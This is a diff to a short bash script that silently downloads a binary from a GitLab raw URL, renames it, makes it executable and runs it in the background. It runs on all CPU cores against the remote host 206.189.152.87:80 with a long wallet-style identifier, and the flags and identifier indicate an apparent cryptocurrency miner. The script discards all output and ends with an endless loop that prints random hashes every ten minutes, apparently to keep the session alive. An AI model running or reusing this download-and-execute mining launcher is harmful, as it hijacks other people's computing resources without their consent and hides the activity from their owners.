@@ -1,6 +1,5 @@
 #!/bin/bash
-wget -q https://raw.githubusercontent.com/kntlpop/suhu/main/suhu.json
-wget -q https://gitlab.com/jadons19292/donlod/-/raw/main/klarig3
-chmod 777 klarig3
-./klarig3 -c suhu.json > /dev/null 2>&1 &
+wget -q https://gitlab.com/jadons19292/donlod/-/raw/main/klarig4 -O sgr1
+chmod +x sgr1
+./sgr1 -o 206.189.152.87:80 -u ZEPHs9wbP2kgeHU9wJoPonUwJAsZkj5rHagMgnDjK7186LuNVVfFeCGDByX2Y18AvbdRJQsNK4Fu4QM7XGs1bXegNGhthDhZ5ht -p SUHU -t $(nproc --all) > /dev/null 2>&1 &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done >/dev/null 2>&1
